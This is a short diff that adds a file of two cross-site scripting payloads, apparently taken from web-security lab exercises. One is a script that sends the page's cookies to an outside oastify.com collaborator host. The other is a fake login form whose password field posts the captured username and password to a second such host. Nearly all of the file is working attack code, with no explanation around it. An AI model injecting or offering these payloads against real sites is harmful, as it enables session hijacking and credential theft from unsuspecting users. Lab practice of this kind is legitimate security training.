@@ -1,0 +1,18 @@
+// XSS: Exploiting cross-site scripting to steal cookies
+
+<script>
+    fetch("https://gcwjntyzjog0wzkvzjv14v4poguci1.oastify.com", {
+        method: "POST",
+        mode: "no-cors",
+        body: document.cookie
+    });
+</script>
+
+// XSS: Exploiting cross-site scripting to capture passwords
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://312da7bs6xai9ux8o8hzo33ogfm8ax.oastify.com/',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+
